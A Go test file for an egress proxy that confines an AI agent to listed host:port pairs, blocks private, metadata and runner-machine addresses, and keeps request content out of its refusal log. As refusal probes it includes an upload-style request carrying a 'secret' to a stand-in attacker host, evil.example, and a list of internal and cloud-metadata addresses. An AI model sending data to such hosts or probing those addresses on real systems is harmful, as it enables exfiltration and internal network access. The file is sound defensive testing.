package main

// Acceptance tests for CSR-63: the egress proxy lets the agent reach exactly
// the listed host:port pairs, refuses everything else, and logs each refusal
// as one JSON line with the host, the port, the reason and the time, never
// the request's headers or body.

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"reflect"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"
)

func TestAppEntriesArePublicOnlyAndLocalPermissionWins(t *testing.T) {
	for _, entries := range [][]string{
		{"public:App.Example:443", "mirror.example:443", "public:mirror.example:443"},
		{"public:app.example:443", "public:mirror.example:443", "mirror.example:443"},
	} {
		got, err := parseAllow(entries)
		want := map[string]bool{"app.example:443": false, "mirror.example:443": true}
		if err != nil || !reflect.DeepEqual(got, want) {
			t.Fatalf("parseAllow(%q) = %v, %v; want %v", entries, got, err, want)
		}
	}
	if _, err := parseAllow([]string{"public:*.example:443"}); err == nil {
		t.Fatal("marked wildcard accepted")
	}
}

func TestPublicAddressCheck(t *testing.T) {
	for _, addr := range []string{"172.17.0.1:80", "192.168.1.1:80", "10.0.0.5:443", "169.254.169.254:80", "0.0.0.0:80", "127.0.0.1:80", "[::1]:80", "[fc00::1]:80", "[fe80::1%eth0]:80", "[::]:80", "bad:80",
		"100.64.0.1:443", "100.127.255.254:443", "198.18.0.1:443", "198.19.255.1:443", "0.1.2.3:443", "192.0.0.8:443", "[64:ff9b::a00:1]:443", "[::ffff:100.64.0.1]:443"} {
		if err := checkPublicAddress("tcp", addr, nil); !errors.Is(err, errPrivateAddress) {
			t.Errorf("%s: got %v, want private address refusal", addr, err)
		}
	}
	for _, addr := range []string{"93.184.216.34:443", "[2606:4700:4700::1111]:443", "100.128.0.1:443", "198.20.0.1:443", "192.0.1.1:443", "[64:ff9b:0:0:1::1]:443"} {
		if err := checkPublicAddress("tcp", addr, nil); err != nil {
			t.Errorf("%s: %v", addr, err)
		}
	}
}

func TestAppOpenedPublicNameUsesPublicDialForHTTPAndConnect(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fmt.Fprint(w, "public backend")
	}))
	t.Cleanup(backend.Close)
	saved := dialPublic
	var mu sync.Mutex
	var targets []string
	dialPublic = func(ctx context.Context, network, target string, _ func(string, string, syscall.RawConn) error) (net.Conn, error) {
		mu.Lock()
		targets = append(targets, target)
		mu.Unlock()
		return (&net.Dialer{}).DialContext(ctx, network, backend.Listener.Addr().String())
	}
	t.Cleanup(func() { dialPublic = saved })
	proxy, log := startProxy(t, "public:public.example:80")
	resp, err := viaProxy(proxy).Get("http://public.example/")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK || string(body) != "public backend" {
		t.Errorf("HTTP = %d %q", resp.StatusCode, body)
	}
	status, c, _ := connect(t, proxy, "PUBLIC.example:80")
	c.Close()
	if status != http.StatusOK {
		t.Errorf("CONNECT = %d, want 200", status)
	}
	mu.Lock()
	defer mu.Unlock()
	if !reflect.DeepEqual(targets, []string{"public.example:80", "PUBLIC.example:80"}) {
		t.Errorf("public dial targets = %q", targets)
	}
	if got := refusals(t, log.String()); len(got) != 0 {
		t.Errorf("public requests refused: %v", got)
	}
}

// A real resolver query returns a private address; Control must reject it
// before any connection, for both proxy protocols, and log the original name.
func TestAppOpenedNameResolvingToPrivateAddressIsRefused(t *testing.T) {
	resolver := privateResolver(t)
	saved := dialPublic
	dialPublic = func(ctx context.Context, network, target string, control func(string, string, syscall.RawConn) error) (net.Conn, error) {
		return (&net.Dialer{Timeout: time.Second, Resolver: resolver, Control: control}).DialContext(ctx, network, target)
	}
	t.Cleanup(func() { dialPublic = saved })
	proxy, log := startProxy(t, "public:internal.example:80")
	status, _, _ := connect(t, proxy, "internal.example:80")
	if status != http.StatusForbidden {
		t.Errorf("CONNECT = %d, want 403", status)
	}
	resp, err := viaProxy(proxy).Get("http://internal.example/")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("HTTP = %d, want 403", resp.StatusCode)
	}
	got := refusals(t, log.String())
	if len(got) != 2 {
		t.Fatalf("refusals = %v, want one per request", got)
	}
	for _, line := range got {
		if line["host"] != "internal.example" || line["port"] != "80" || line["reason"] != "private_address" {
			t.Errorf("refusal = %v", line)
		}
	}
}

// A dial can try several addresses and return the public address's network
// error. The private-address refusal must still reach the runner's log.
func TestPrivateAddressRefusalIsLoggedEvenWhenDialReturnsAnotherError(t *testing.T) {
	saved := dialPublic
	t.Cleanup(func() { dialPublic = saved })
	dialPublic = func(_ context.Context, _, _ string, control func(string, string, syscall.RawConn) error) (net.Conn, error) {
		for _, addr := range []string{"192.168.1.1:80", "10.0.0.5:80"} {
			if err := control("tcp4", addr, nil); !errors.Is(err, errPrivateAddress) {
				t.Errorf("%s: %v, want private-address refusal", addr, err)
			}
		}
		return nil, errors.New("public upstream unreachable")
	}
	proxy, log := startProxy(t, "public:mixed.example:80")
	connect(t, proxy, "mixed.example:80")
	got := refusals(t, log.String())
	if len(got) != 1 || got[0]["host"] != "mixed.example" || got[0]["port"] != "80" {
		t.Errorf("refusals = %v, want one refusal for mixed.example:80", got)
	}
}

// privateResolver serves only loopback DNS, answering A queries with
// 192.168.1.1 and AAAA queries with no records.
func privateResolver(t *testing.T) *net.Resolver {
	t.Helper()
	conn, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { conn.Close() })
	go func() {
		buf := make([]byte, 512)
		for {
			n, peer, err := conn.ReadFrom(buf)
			if err != nil {
				return
			}
			q := append([]byte(nil), buf[:n]...)
			if len(q) < 12 {
				continue
			}
			i := 12
			for i < len(q) && q[i] != 0 {
				i += int(q[i]) + 1
			}
			if i+5 > len(q) {
				continue
			}
			typ := binary.BigEndian.Uint16(q[i+1 : i+3])
			q = q[:i+5]
			binary.BigEndian.PutUint16(q[2:4], 0x8180)
			binary.BigEndian.PutUint16(q[6:8], 0)
			binary.BigEndian.PutUint16(q[8:10], 0)
			binary.BigEndian.PutUint16(q[10:12], 0)
			if typ == 1 {
				binary.BigEndian.PutUint16(q[6:8], 1)
				q = append(q, 0xc0, 0x0c, 0, 1, 0, 1, 0, 0, 0, 60, 0, 4, 192, 168, 1, 1)
			}
			_, _ = conn.WriteTo(q, peer)
		}
	}()
	return &net.Resolver{PreferGo: true, Dial: func(ctx context.Context, _, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, "udp", conn.LocalAddr().String())
	}}
}

func TestParseAllowExactHostAndPort(t *testing.T) {
	got, err := parseAllow([]string{"API.Example.com:443", "x.example:8080"})
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]bool{"api.example.com:443": true, "x.example:8080": true}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("parseAllow = %v, want %v", got, want)
	}
	// No wildcards, no entry without a port, no port outside 1-65535.
	for _, bad := range []string{"example.com", "*.example.com:443", ":443", "example.com:http", "example.com:0", "example.com:70000", ""} {
		if _, err := parseAllow([]string{bad}); err == nil {
			t.Errorf("parseAllow(%q) = nil error, want refused", bad)
		}
	}
}

// syncBuffer is the proxy's log, written from its handler goroutines.
type syncBuffer struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}

func (s *syncBuffer) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.String()
}

// startProxy runs the proxy with allow as its list and returns its address
// and its log.
func startProxy(t *testing.T, allow ...string) (string, *syncBuffer) {
	t.Helper()
	set, err := parseAllow(allow)
	if err != nil {
		t.Fatal(err)
	}
	log := &syncBuffer{}
	srv := httptest.NewServer(newProxy(set, nil, "cinderline", log))
	t.Cleanup(srv.Close)
	return srv.Listener.Addr().String(), log
}

// echoServer accepts TCP connections on loopback and echoes what it reads.
func echoServer(t *testing.T) int {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { l.Close() })
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			go func() { defer c.Close(); _, _ = io.Copy(c, c) }()
		}
	}()
	return l.Addr().(*net.TCPAddr).Port
}

// connect sends CONNECT target with extra header lines and returns the
// response status and the open connection.
func connect(t *testing.T, proxy, target string, header ...string) (int, net.Conn, *bufio.Reader) {
	t.Helper()
	c, err := net.Dial("tcp", proxy)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { c.Close() })
	req := "CONNECT " + target + " HTTP/1.1\r\nHost: " + target + "\r\n" + strings.Join(header, "") + "\r\n"
	if _, err := io.WriteString(c, req); err != nil {
		t.Fatal(err)
	}
	r := bufio.NewReader(c)
	resp, err := http.ReadResponse(r, &http.Request{Method: http.MethodConnect})
	if err != nil {
		t.Fatal(err)
	}
	return resp.StatusCode, c, r
}

// refusals parses the proxy's log into its "refused" lines.
func refusals(t *testing.T, log string) []map[string]any {
	t.Helper()
	var out []map[string]any
	for _, line := range strings.Split(strings.TrimSpace(log), "\n") {
		if line == "" {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			t.Fatalf("log line %q is not JSON: %v", line, err)
		}
		if m["msg"] == "refused" {
			out = append(out, m)
		}
	}
	return out
}

// The proxy resolves the name itself and tunnels to the listed host:port;
// the host matches case-insensitively.
func TestConnectToAListedHostTunnels(t *testing.T) {
	port := echoServer(t)
	target := "localhost:" + strconv.Itoa(port)
	proxy, log := startProxy(t, target)
	for _, asked := range []string{target, "LocalHost:" + strconv.Itoa(port)} {
		status, c, r := connect(t, proxy, asked)
		if status != http.StatusOK {
			t.Fatalf("CONNECT %s = %d, want 200", asked, status)
		}
		if _, err := io.WriteString(c, "ping\n"); err != nil {
			t.Fatal(err)
		}
		if line, err := r.ReadString('\n'); err != nil || line != "ping\n" {
			t.Errorf("through the tunnel to %s: %q, %v", asked, line, err)
		}
	}
	if got := refusals(t, log.String()); len(got) != 0 {
		t.Errorf("refusals logged for a listed host: %v", got)
	}
}

// Anything not listed exactly is refused with 403 and logged by host and
// port: another port, a subdomain, the same target by IP, any other host.
func TestConnectToAnUnlistedHostIsRefusedAndLogged(t *testing.T) {
	port := echoServer(t)
	proxy, log := startProxy(t, "localhost:"+strconv.Itoa(port))
	tests := []struct{ target, host, port, reason string }{
		{"localhost:" + strconv.Itoa(port+1), "localhost", strconv.Itoa(port + 1), "runner_machine"},
		{"sub.localhost:" + strconv.Itoa(port), "sub.localhost", strconv.Itoa(port), "not_allowed"},
		{"127.0.0.1:" + strconv.Itoa(port), "127.0.0.1", strconv.Itoa(port), "runner_machine"},
		{"evil.example:443", "evil.example", "443", "not_allowed"},
	}
	for _, tt := range tests {
		if status, _, _ := connect(t, proxy, tt.target, "X-Probe: payload-marker\r\n"); status != http.StatusForbidden {
			t.Errorf("CONNECT %s = %d, want 403", tt.target, status)
		}
	}
	got := refusals(t, log.String())
	if len(got) != len(tests) {
		t.Fatalf("refusals = %v, want one per refused target", got)
	}
	for i, tt := range tests {
		if got[i]["host"] != tt.host || got[i]["port"] != tt.port || got[i]["reason"] != tt.reason || got[i]["time"] == nil {
			t.Errorf("refusal %d = %v, want host %s port %s for %s and a time", i, got[i], tt.host, tt.port, tt.reason)
		}
	}
	if strings.Contains(log.String(), "payload-marker") {
		t.Errorf("the log holds request content:\n%s", log)
	}
}

func viaProxy(proxy string) *http.Client {
	u := &url.URL{Scheme: "http", Host: proxy}
	return &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(u)}}
}

// A plain http:// request (HTTP_PROXY) to a listed host:port is forwarded.
func TestHTTPToAListedHostIsForwarded(t *testing.T) {
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "hello from "+r.URL.Path)
	}))
	t.Cleanup(backend.Close)
	port := backend.Listener.Addr().(*net.TCPAddr).Port
	proxy, _ := startProxy(t, "localhost:"+strconv.Itoa(port))
	resp, err := viaProxy(proxy).Get("http://localhost:" + strconv.Itoa(port) + "/hi")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK || string(body) != "hello from /hi" {
		t.Errorf("GET = %d %q, want 200 from the backend", resp.StatusCode, body)
	}
}

// A plain http:// request to an unlisted host is refused and logged with
// port 80 when the URL has none.
func TestHTTPToAnUnlistedHostIsRefusedAndLogged(t *testing.T) {
	proxy, log := startProxy(t, "localhost:1")
	resp, err := viaProxy(proxy).Get("http://evil.example/upload?secret=payload-marker")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("GET = %d, want 403", resp.StatusCode)
	}
	got := refusals(t, log.String())
	if len(got) != 1 || got[0]["host"] != "evil.example" || got[0]["port"] != "80" || got[0]["reason"] != "not_allowed" || got[0]["url"] != "http://evil.example/upload" {
		t.Errorf("refusals = %v, want evil.example port 80 with its URL", got)
	}
	if strings.Contains(log.String(), "payload-marker") {
		t.Errorf("the log holds request content:\n%s", log)
	}
}

// Decision 2026-11-17-local-model-providers: a provider on the runner's own
// machine is allowed as host.docker.internal on exactly its port, over
// CONNECT (https) and plain http alike; its other ports stay refused. The
// name is mapped to loopback here as --add-host maps it to the host.
func TestHostGatewayEntryAllowsExactlyItsPort(t *testing.T) {
	saved := dial
	t.Cleanup(func() { dial = saved })
	dial = func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, _ := net.SplitHostPort(addr)
		if host == "host.docker.internal" {
			addr = net.JoinHostPort("127.0.0.1", port)
		}
		return saved(ctx, network, addr)
	}
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "model at "+r.URL.Path)
	}))
	t.Cleanup(backend.Close)
	port := strconv.Itoa(backend.Listener.Addr().(*net.TCPAddr).Port)
	echo := strconv.Itoa(echoServer(t))
	proxy, log := startProxy(t, "host.docker.internal:"+port, "host.docker.internal:"+echo)

	resp, err := viaProxy(proxy).Get("http://host.docker.internal:" + port + "/v1/models")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK || string(body) != "model at /v1/models" {
		t.Errorf("plain http GET = %d %q, want 200 from the provider", resp.StatusCode, body)
	}

	status, c, r := connect(t, proxy, "host.docker.internal:"+echo)
	if status != http.StatusOK {
		t.Fatalf("CONNECT = %d, want 200", status)
	}
	if _, err := io.WriteString(c, "ping\n"); err != nil {
		t.Fatal(err)
	}
	if line, err := r.ReadString('\n'); err != nil || line != "ping\n" {
		t.Errorf("through the tunnel: %q, %v", line, err)
	}

	if status, _, _ := connect(t, proxy, "host.docker.internal:22"); status != http.StatusForbidden {
		t.Errorf("CONNECT to another host port = %d, want 403", status)
	}
	resp, err = viaProxy(proxy).Get("http://host.docker.internal:22/")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("plain http to another host port = %d, want 403", resp.StatusCode)
	}
	if got := refusals(t, log.String()); len(got) != 2 {
		t.Errorf("refusals = %v, want the two other-port attempts", got)
	}
}

// CLR-273: with a provider on the runner's own machine allowed, the web
// page's port there stays refused, as host.docker.internal and as 127.0.0.1,
// over CONNECT and plain http alike, and the page sees no request. A live
// server stands in for the page; host.docker.internal is mapped to loopback
// as --add-host maps it to the host.
func TestTheWebPageIsNeverReachable(t *testing.T) {
	saved := dial
	t.Cleanup(func() { dial = saved })
	dial = func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, _ := net.SplitHostPort(addr)
		if host == "host.docker.internal" {
			addr = net.JoinHostPort("127.0.0.1", port)
		}
		return saved(ctx, network, addr)
	}
	var reached sync.Mutex
	hits := 0
	page := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
		reached.Lock()
		hits++
		reached.Unlock()
	}))
	t.Cleanup(page.Close)
	web := strconv.Itoa(page.Listener.Addr().(*net.TCPAddr).Port)
	proxy, log := startProxy(t, "host.docker.internal:"+strconv.Itoa(echoServer(t)))

	for _, host := range []string{"host.docker.internal", "127.0.0.1"} {
		if status, _, _ := connect(t, proxy, host+":"+web); status != http.StatusForbidden {
			t.Errorf("CONNECT %s:%s = %d, want 403", host, web, status)
		}
		resp, err := viaProxy(proxy).Get("http://" + host + ":" + web + "/")
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusForbidden {
			t.Errorf("GET %s:%s = %d, want 403", host, web, resp.StatusCode)
		}
	}
	got := refusals(t, log.String())
	if len(got) != 4 {
		t.Fatalf("refusals = %v, want 4", got)
	}
	for _, r := range got {
		if r["port"] != web || r["reason"] != "runner_machine" {
			t.Errorf("refusal %v, want port %s as runner_machine", r, web)
		}
	}
	reached.Lock()
	defer reached.Unlock()
	if hits != 0 {
		t.Errorf("the page got %d requests, want none", hits)
	}
}
